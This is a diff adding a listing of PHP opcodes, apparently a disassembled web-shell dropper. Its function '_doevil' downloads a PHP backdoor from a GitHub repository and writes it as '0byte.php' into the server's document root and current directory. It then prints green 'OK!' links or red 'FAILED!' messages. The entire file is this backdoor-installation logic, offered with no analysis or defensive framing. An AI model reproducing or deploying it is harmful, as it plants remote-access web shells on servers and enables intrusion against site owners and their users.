@@ -1,0 +1,66 @@
+FunctionStart 
+ASSIGN 'https://raw.githubusercontent.com/zerobyte-id/PHP-Backdoor/master/0byt3m1n1/0byt3m1n1.php'
+ASSIGN '0byte.php'
+INIT_FCALL '_doevil'
+DO_FCALL 
+ECHO '  '
+RETURN 1
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'file_get_contents'
+DO_ICALL 
+FETCH_R '_SERVER'
+FETCH_DIM_R 'DOCUMENT_ROOT'
+CONCAT '/'
+INIT_FCALL 'fopen'
+ROPE_ADD '/'
+SEND_VAL 'w'
+DO_ICALL 
+INIT_FCALL 'fwrite'
+DO_ICALL 
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTPS'
+QM_ASSIGN 'https'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+FAST_CONCAT '://'
+CONCAT 'http'
+FAST_CONCAT '/'
+INIT_FCALL 'getcwd'
+DO_ICALL 
+CONCAT '/'
+INIT_FCALL 'fopen'
+ROPE_ADD '/'
+SEND_VAL 'w'
+DO_ICALL 
+INIT_FCALL 'fwrite'
+DO_ICALL 
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTPS'
+QM_ASSIGN 'https'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+FAST_CONCAT '://'
+CONCAT 'http'
+INIT_FCALL 'dirname'
+FETCH_CONSTANT 'REQUEST_URI'
+FETCH_R '_SERVER'
+DO_ICALL 
+FAST_CONCAT '/'
+ECHO '<center>'
+INIT_FCALL 'file_exists'
+DO_ICALL 
+ROPE_INIT '<h1><font color="#00FF00">[OK!] <a href="'
+ROPE_ADD '" target="_blank">'
+ROPE_END '</a></font></h1>'
+ROPE_INIT '<h1><font color="red">'
+ROPE_END '<br>Doesn't exist!</font>Try with another method!</h1>'
+INIT_FCALL 'file_exists'
+DO_ICALL 
+ROPE_INIT '<h1><font color="#00FF00">[OK!] <a href="'
+ROPE_ADD '" target="_blank">'
+ROPE_END '</a></font></h1>'
+ECHO '<h1><font color="red">FAILED!</font></h1>'
+ECHO '</center>'
+RETURN 'null'
+FunctionEnd 
